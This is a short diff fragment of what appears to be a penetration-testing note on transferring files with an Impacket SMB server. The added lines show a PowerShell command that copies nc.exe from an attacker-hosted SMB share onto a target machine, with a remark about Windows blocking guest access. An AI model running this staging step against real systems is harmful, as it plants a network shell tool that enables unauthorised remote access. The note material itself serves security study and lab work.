@@ -124,4 +124,8 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Config file parsed
 ```
 
-#### Copy f
+#### Copy file from SMB server to on target machine
+```powershell
+copy \\192.168.220.133\share\nc.exe
+```
+- However, newer versions of windows block unauthenticated guest access 
